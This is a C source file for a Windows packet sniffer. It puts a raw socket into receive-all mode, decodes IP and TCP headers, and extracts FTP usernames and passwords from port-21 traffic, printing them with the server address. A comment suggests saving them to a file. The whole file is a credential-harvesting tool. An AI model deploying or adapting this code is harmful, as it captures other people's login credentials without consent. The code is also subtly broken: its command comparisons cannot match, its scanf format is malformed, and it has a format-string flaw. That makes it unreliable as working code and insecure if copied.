#include "Sniffer.h"

void DecodeTCPPacket(char* pData){
	TCPHeader* pTcpHdr = (TCPHeader*)pData;
	printf("Port:%d-%d\n",::ntohs(pTcpHdr->sourcePort),::ntohs(pTcpHdr->destinationPort));
	//下面还可以根据端口号进一步解析应用协议
	switch (::ntohs(pTcpHdr->destinationPort))
	{
	case 21:
		break;
	case 80:
		break;
	case 8080:
		break;
	}
}

void DecodeIPPacket(char* pData){
	IPHeader* pIpHdr = (IPHeader*)pData;
	in_addr source,dest;
	char szSourceIP[32],szDestIP[32];
	printf("\n-----------------\n");
	//从IP头中取出源地址 和目的地址
	source.S_un.S_addr = pIpHdr->ipSource;
	dest.S_un.S_addr = pIpHdr->ipDestination;
	strcpy(szSourceIP,::inet_ntoa(source));
	strcpy(szDestIP,::inet_ntoa(dest));
	printf("  %s->%s\n",szSourceIP,szDestIP);
	//IP头长度
	int nHeaderLen = (pIpHdr->ihpVerLen & 0xf)* sizeof(ULONG);
	switch (pIpHdr->ipProtocol)
	{
	case IPPROTO_TCP:
		{
			TCPHeader* pTcpHdr = (TCPHeader*)(pData + nHeaderLen);
			switch (::ntohs(pTcpHdr->destinationPort))
			{
			case 21://ftp协议端口
				GetFtp((char*)pTcpHdr + sizeof(TCPHeader),pIpHdr->ipDestination);
				break;
			case 80://http
				break;
			case 8080:
				break;
			}
		}
		break;
	case IPPROTO_UDP:
		break;
	case IPPROTO_ICMP:
		break;
	}
}

void Sniffer(){
	printf("************Sniffer************\n");

	SOCKET sRaw = ::socket(AF_INET,SOCK_RAW,IPPROTO_IP);
	//获取本地地址
	char szHostName[56];
	SOCKADDR_IN addr_in;
	struct  hostent* pHost;
	::gethostname(szHostName,56);
	if ((pHost = gethostbyname((char*)szHostName))== NULL)
		return ;
	//在调用ioctl之前  套接字必须绑定
	addr_in.sin_family = AF_INET;
	addr_in.sin_port = ::htons(0);
	memcpy(&addr_in.sin_addr.S_un.S_addr,pHost->h_addr_list[0],pHost->h_length);
	printf("Binding to interface: %s\n",::inet_ntoa(addr_in.sin_addr));
	if(::bind(sRaw,(PSOCKADDR)&addr_in,sizeof(addr_in)) == SOCKET_ERROR)
		return;
	//设置SIO_RCVALL控制代码 以便接听所有的IP包
	DWORD dwValue = 1;
	if(::ioctlsocket(sRaw,SIO_RCVALL,&dwValue) != 0) //混杂模式 接听所有的封包 SIO_RCVALL需要引用mstcpip.h
		return;
	//开始接收封包
	char buff[1024];
	int nRet;
	while (TRUE)
	{
		nRet = recv(sRaw,buff,1024,0);
		if(nRet >0)
			DecodeIPPacket(buff);
	}

	::closesocket(sRaw);

}


void GetFtp(char* pData,DWORD dwDestIP){
	char szBuff[256];
	static char szUserName[21];
	static char szPassword[21];
	if(strnicmp(pData,"USER",5) == 0)
		sscanf(pData + 4,"%*[]%s",szUserName);
	else if (strnicmp(pData,"PASS",5) == 0)
	{
		sscanf(pData + 4,"%*[]%s",szPassword);
		wsprintf(szBuff,"Server Address:%s; UserName: %s;Password: %s\n\n",
			::inet_ntoa(*(in_addr*)&dwDestIP),szUserName,szPassword);
		printf(szBuff);//这里可以将它保存到文件中
	}
}